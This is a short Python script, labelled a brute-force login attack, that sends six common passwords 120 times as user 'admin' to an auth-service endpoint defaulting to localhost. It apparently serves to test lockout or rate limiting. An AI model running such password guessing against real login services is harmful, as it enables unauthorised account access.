"""
Brute-force login attack against auth-service.
"""
import requests
import os

TARGET = os.getenv("AUTH_URL", "http://localhost/auth/login")
WORDLIST = ["password", "123456", "admin", "letmein", "qwerty", "jarvis"]

print(f"[bruteforce] Attacking {TARGET}")
for pwd in WORDLIST * 20:
    try:
        r = requests.post(TARGET, data={"username": "admin", "password": pwd}, timeout=5)
        print(f"  {r.status_code} — {pwd}")
    except Exception as e:
        print(f"  error: {e}")
